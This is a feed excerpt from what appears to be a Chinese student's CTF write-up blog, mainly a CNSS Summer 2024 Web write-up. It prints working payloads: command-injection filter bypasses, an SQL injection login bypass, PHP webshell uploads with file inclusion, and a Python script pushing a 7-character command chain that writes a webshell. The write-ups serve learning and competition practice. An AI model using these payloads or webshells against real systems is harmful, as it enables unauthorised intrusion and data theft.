else</h2><p>有空再补，这些题目挺有意思的，说不定在<strong>XSCTF2025</strong>又能看见改版了()</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><p>我记得简单打了几题，不是很想记录，跳了</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="我意同君共天涯"><a class="markdownIt-Anchor" href="#我意同君共天涯"></a> 👑 我意同君共天涯()</h2><p><strong>SUID提权</strong>，我记得有<code>curl</code>，但是我当时没做出来，后面看到有人说<code>curl访问</code>即可，不清楚，因为环境已经没了</p><h2 id="我很会c"><a class="markdownIt-Anchor" href="#我很会c"></a> 🫡我很会C++</h2><p>就简单的数据处理</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;课堂作业.cpp&quot;</span>, <span class="string">&#x27;r&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;CNSS&#123;&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(content)-<span class="number">14</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= j &lt;= <span class="number">9</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">27</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">10</span> &lt;= j &lt;= <span class="number">99</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">28</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">100</span> &lt;= j &lt;= <span class="number">999</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">29</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">1000</span> &lt;= j &lt;= <span class="number">9999</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">30</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">10000</span> &lt;= j &lt;= <span class="number">99999</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">31</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> num != <span class="built_in">str</span>(j):</span><br><span class="line">            <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="璇椾汉鎻c寔"><a class="markdownIt-Anchor" href="#璇椾汉鎻c寔"></a> ❓ 璇椾汉鎻℃寔</h2><p><code>澹归浂鎹屽弫闆舵崒鎹屼紞璐伴浂闄嗛檰鍙侀浂鏌掓煉闄嗕紞闆跺９澹硅倖鑲嗘崒鎹岄檰鏌掍紞澹圭帠</code><br /><a href="http://www.mytju.com/classcode/tools/messycoderecover.asp">http://www.mytju.com/classcode/tools/messycoderecover.asp</a><br /><code>壹零捌叁零捌捌伍贰零陆陆叁零柒柒陆伍零壹壹肆肆捌捌陆柒伍壹玖</code><br /><code>cnss&#123;108308852066307765011448867519&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;密码全题目&lt;a href=&quot;https://pqgcg6fs2k6.feishu.cn/wiki/Z93RwKTZZiYftskDqbAcDyyenkh?from=from_copylink&quot;&gt;链接&lt;/a&gt;&lt;br /&gt;
当初为了以后拷打学弟，全下了&lt;/p&gt;
&lt;h1 id=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CNSS Summer 2024 WriteUp</title>
    <link href="https://hvang10.github.io/2024/09/07/CNSS-Summer-2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/09/07/CNSS-Summer-2024-WriteUp/</id>
    <published>2024-09-07T13:50:47.000Z</published>
    <updated>2025-08-18T20:03:40.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="babyhttp"><a class="markdownIt-Anchor" href="#babyhttp"></a> 🦴 babyHTTP</h2><p>考点<code>GET POST Cookie</code>，<code>HTTP基础知识</code></p><p><img src="https://picx.zhimg.com/80/v2-3f2ab642ac73aab5f8fe835442e3aa66_1440w.png" alt="" /></p><h2 id="️-phpinfo"><a class="markdownIt-Anchor" href="#️-phpinfo"></a> 🙋🏼‍♀️ PHPinfo</h2><p>考点<code>phpinfo()</code></p><p><code>http://111.229.23.244:50002/phpinfo.php</code><br /><code>ctrl+f</code>，搜索<code>cnss</code></p><h2 id="我得再快点"><a class="markdownIt-Anchor" href="#我得再快点"></a> 🥇 我得再快点</h2><p>利用正则表达式获取前端数据的<code>Key</code>的值，进行<code>md5</code>加密，再<code>Python</code>访问<code>payload</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">url = <span class="string">&#x27;http://152.136.11.155:10103&#x27;</span></span><br><span class="line"><span class="comment"># 循环获取页面内容</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = requests.get(url, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配Key后面的字符串</span></span><br><span class="line">    pattern = <span class="string">r&#x27;Key : (\w+)&#x27;</span></span><br><span class="line">    <span class="comment"># 搜索匹配的字符串</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    s = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">str</span> = md5(s.encode()).hexdigest()</span><br><span class="line">    url = <span class="string">f&#x27;http://152.136.11.155:10103/check?value=<span class="subst">&#123;<span class="built_in">str</span>&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>考点<code>编写数据提取的脚本能力？</code></p><h2 id="ping"><a class="markdownIt-Anchor" href="#ping"></a> 🏓 Ping</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ping_result</span> = <span class="title function_ invoke__">ping</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="variable">$ping_result</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>应该是过滤了某些命令拼接符<code>;|</code>等，换行符<code>%0a</code>绕过，然后是空格绕过<code>%09</code><br /><code>post: ip=127.0.0.1%0acat%09/f*</code></p><p>考点<code>127.0.0.1 %0a ls %09 cat *</code></p><h2 id="cnss娘の宠物商店"><a class="markdownIt-Anchor" href="#cnss娘の宠物商店"></a> 🐶 CNSS娘の宠物商店</h2><p>先试试万能密码<br /><code>admin  ，  1'or'1'='1</code></p><p>考点<code>简单的SQL注入</code></p><h2 id="2048"><a class="markdownIt-Anchor" href="#2048"></a> 🎮 2048</h2><p>无法使用<code>bp</code>抓包(目的也是为了修改分数)</p><p>查看<code>js</code>文件，发现<code>F12</code>被禁用，点击<code>Flag</code>按钮再<code>F12</code></p><p>发现没有<code>flag</code>相关信息(特殊编码之类的)，我觉得可以修改<code>js</code>文件里的<code>score</code>的加分规则，火狐修改不了，但谷歌浏览器应该可以(暂未试验)，或者把网页下载下来再修改</p><p>使用到了控制台<br /><img src="https://pic1.zhimg.com/80/v2-69c1d329ccb815b861cd1181f95d1828_1440w.png" alt="" /><br />此时分数已经被修改成功</p><p>考点<code>简单的js小游戏</code></p><h2 id="换个头像先"><a class="markdownIt-Anchor" href="#换个头像先"></a> 👤 换个头像先</h2><p>经典老题，前端检验文件后缀<br /><code>1.png</code>，内容为<code>&lt;?php eval($_GET['1']);?&gt;</code></p><p><code>bp</code>抓包，改为<code>1.php</code></p><p>然后在网络中找到上传路径访问<br /><code>http://152.136.11.155:10107/avatars/a799bfa76e49bb0e43190454ff941710/1.php?1=system(&quot;cat /flag&quot;);</code></p><p><code>cnss&#123;D4ng3r0us_Fl13_UpI0ad!&#125;</code><br />考点<code>抓包绕过前端检验</code></p><p>PS: 如上次<code>NewStarCTF2023</code>一样，命令没有反应，怎么办呢？换一个浏览器。。。纯坑爹</p><h2 id="can-can-need-shell"><a class="markdownIt-Anchor" href="#can-can-need-shell"></a> 🚓 can can need shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查是否有文件上传</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>];</span><br><span class="line">    <span class="comment">// 获取上传文件的名称</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line">    <span class="comment">// 获取文件扩展名</span></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="comment">// 检查文件大小</span></span><br><span class="line">    <span class="variable">$maxSize</span> = <span class="number">102400</span>; <span class="comment">// 以字节为单位的最大文件大小</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$maxSize</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;文件大小超出限制！&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 允许的文件扩展名</span></span><br><span class="line">    <span class="variable">$allowedExtensions</span> = [ <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;php&#x27;</span>];</span><br><span class="line">    <span class="comment">// 检查文件扩展名是否被允许</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>), <span class="variable">$allowedExtensions</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;不允许的文件类型！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 防火防盗防黑客</span></span><br><span class="line">    <span class="variable">$checkExtensions</span> = [<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>), <span class="variable">$checkExtensions</span>)) &#123;</span><br><span class="line">        <span class="variable">$dangerous</span> = <span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$uploadedFile</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$dangerous</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">                <span class="variable">$res</span> = <span class="title function_ invoke__">stristr</span>(<span class="variable">$line</span>,<span class="variable">$value</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$res</span> != <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;防黑客&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 检查文件上传过程中是否有错误</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;文件上传出错！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 移动文件到指定目录</span></span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;CNSS&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="comment">// 检查目录是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">        <span class="comment">// 目录不存在，创建目录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;目录创建成功&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;出错啦！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randomNumber</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>, <span class="number">10000</span>);</span><br><span class="line">    <span class="comment">//随机一个文件名</span></span><br><span class="line">    <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span>  . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;CNSS&quot;</span>. <span class="variable">$randomNumber</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>)) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span> ;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传成功，路径如下： &#x27;</span>. <span class="variable">$uploadPath</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">谁TM一开始跟我说的条件竞争。。。。</span><br><span class="line">他允许后缀[ <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">同时对[<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>]这些后缀名的文件进行检测，黑名单是<span class="string">&#x27;eval&#x27;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span></span><br><span class="line">这也不是条件竞争，我当时也没细看，就信了，然后我bp好像弄不了条件竞争，就下班不看了</span><br><span class="line">后面被某人cue了一下，之后平台关了，在自己vps上面搭建了一下环境</span><br><span class="line">思路如下，先上传一个png文件，这里没有任何检测，里面是命令执行&lt;?php system(<span class="string">&quot;cat /flag&quot;</span>);?&gt;</span><br><span class="line">然后上传php文件，include和引号没有被过滤，用于包含我们的png文件</span><br><span class="line">&lt;?php include <span class="string">&quot;/var/www/html/uploads/54f29efe821e25c44ac9858175a8af1f/7a91379285d4e81fb90af4c944ca289f.png&quot;</span>;?&gt;</span><br><span class="line">然后，访问返回的php文件路径即可</span><br><span class="line">文件上传脚本</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- action的链接，是当前题目的上传文件的链接--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;vps&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploaded_file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>考点，<code>代码审计+文件包含</code></p><h2 id="7️⃣-ezrcccce"><a class="markdownIt-Anchor" href="#7️⃣-ezrcccce"></a> 7️⃣ EZRCCCCE</h2><p>简单的7字符拼接，<a href="https://blog.csdn.net/nzjdsds/article/details/102873187">https://blog.csdn.net/nzjdsds/article/details/102873187</a><br /><code>payload.txt</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://152.136.11.155:10109/?6=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\cnss\\web\payload.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://152.136.11.155:10109/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>最终<code>payload</code>，<code>http://152.136.11.155:10109/1.php?1=system(&quot;cat /flag&quot;);</code></p><p><code>cnss&#123;y0u_Rea11y_kn0w_h0w_7o_k22p_fit&#125;</code><br />考点<code>拼接字符串写入一句话</code><br />其实有反弹<code>shell</code>版，但<code>bash</code>被ban，<code>nc</code>的搞了一下没啥反应</p><h2 id="where-is-my-unserialize"><a class="markdownIt-Anchor" href="#where-is-my-unserialize"></a> 🔧 where is my unserialize?</h2><p>没有直接提供源码，没有<code>unserialize函数</code>，<code>phar</code>反序列化，太明显了题目<br />还可以查看文件，<code>url/file.php?file=upload_file.php</code>，得到信息<code>function.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>;</span><br><span class="line"><span class="comment">//header(&quot;Content-type: text/html;charset=utf-8&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功喵!&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123;</span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h4&gt;请选择上传的文件喵:&quot;</span> . <span class="string">&quot;&lt;h4/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>base.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;CNSS&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span 